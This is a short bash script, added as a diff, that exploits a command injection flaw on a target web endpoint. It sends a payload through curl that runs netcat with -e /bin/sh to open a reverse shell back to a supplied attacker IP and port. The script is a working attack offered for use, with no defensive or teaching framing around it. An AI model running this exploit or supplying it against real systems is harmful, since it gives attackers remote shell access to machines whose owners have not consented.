@@ -1,0 +1,21 @@
+#!/bin/bash
+
+# Usage: ./command_injection_reverse_shell.sh <target_url> <attacker_ip> <attacker_port>
+TARGET_URL=$1
+ATTACKER_IP=$2
+ATTACKER_PORT=$3
+
+if [ -z "$TARGET_URL" ] || [ -z "$ATTACKER_IP" ] || [ -z "$ATTACKER_PORT" ]; then
+    echo "Usage: $0 <target_url> <attacker_ip> <attacker_port>"
+    exit 1
+fi
+
+echo "Exploiting command injection on $TARGET_URL..."
+
+# Command Injection payload
+PAYLOAD="; nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh"
+
+# Send the payload
+curl -s -G --data "input=$PAYLOAD" "$TARGET_URL/execute"
+
+echo "Command injection exploit attempt completed."
